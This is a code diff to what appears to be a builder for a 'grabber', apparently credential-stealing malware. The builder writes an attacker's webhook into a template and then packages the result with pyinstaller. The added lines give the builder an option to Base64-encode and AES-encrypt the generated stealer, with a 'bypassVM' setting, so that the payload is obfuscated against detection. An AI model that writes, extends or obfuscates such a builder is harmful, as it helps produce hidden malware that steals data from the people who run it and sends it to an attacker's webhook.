@@ -3,6 +3,7 @@ import os
 import shutil
 from colorama import Fore
 import time
+import Base64_encode, AES_encrypt
 from os.path import exists
 
 def black(text):
@@ -59,6 +60,18 @@ def main():
             print(f"{Fore.YELLOW}Injecting...{Fore.RESET}")
             f.write(raw.replace("YOUR_WEBHOOK", webhook).replace("YES_NO", "y"))   
             f.close
+    enc = input(f"{Fore.CYAN}Encrypt? (y/n): {Fore.RESET}").lower()
+    if enc == "y":
+        print(f"{Fore.YELLOW}Start Encrypting....{Fore.RESET}")
+        bypassVM = "n"
+        key = "10"
+        pathenc = f"{tempfolder}\\{grabbername}.py"
+        test2 = Base64_encode.Encode()
+        test1 = AES_encrypt.Encryptor(key, pathenc,bypassVM)
+        test2.encode(pathenc)
+        test1.encrypt_file()
+        print(f"{Fore.GREEN}Encrypting Completed Successfully!{Fore.RESET}")
+    else: print(f"{Fore.YELLOW}No Encrypting{Fore.RESET}")    
     print(f"{Fore.YELLOW}Checking Requirements...{Fore.RESET}")
     os.system("pip install pyinstaller")
     os.system("pip install --upgrade -r requirements.txt")
